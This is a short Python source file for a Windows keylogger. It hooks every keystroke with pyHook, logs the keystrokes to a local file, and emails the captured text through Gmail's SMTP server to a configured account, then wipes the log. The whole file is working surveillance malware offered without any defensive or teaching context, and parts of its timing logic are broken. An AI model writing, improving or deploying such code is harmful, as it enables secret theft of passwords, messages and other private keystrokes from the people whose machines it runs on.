import os, sys, logging
import subprocess
from datetime import datetime
import time
import pyHook, pythoncom
import requests
import json

email = ""
password = ""


sec = 0
timeout = time.time() + sec
file_log = 'log.dat'

def time_out():
    if time.time() > time_out:
        return True
    else: return False

def send_email(user, pwd, recipient, subject, body):
    import smtplib

    smtp_user = user
    smtp_passwd = pwd
    FROM = user
    TO = recipient if type(recipient) is list else [recipient]
    SUBJECT = subject
    TEXT = body

    message = """\From: %s\nTo: %s\nSubject: %s\n\n%s
    """ % (FROM, ", ".join(TO), SUBJECT, TEXT)
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.login(smtp_user, smtp_passwd)
        server.sendmail(FROM, TO, message)
    except:
        print 'Error'

def format_send_email():
    with open(file_log,'r+') as f:
        actualdate = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        content = f.read().replace('\n','');
        content = 'Log Retrieve : '+actualdate+'\n' +content
        send_email(email, password, email, ' New Log - ' + actualdate, content)
        f.seek(0)
        f.truncate()

def on_keyboard_event(event):
    logging.basicConfig(
        filename=file_log,
        level=logging.DEBUG,
        format='%(message)s'
    )
    logging.log(10, chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = on_keyboard_event
hooks_manager.HookKeyboard()

if __name__ == '__main__':
    if time_out():
        format_send_email()
        time_out = time.time() + sec
    pythoncom.PumpWaitingMessages()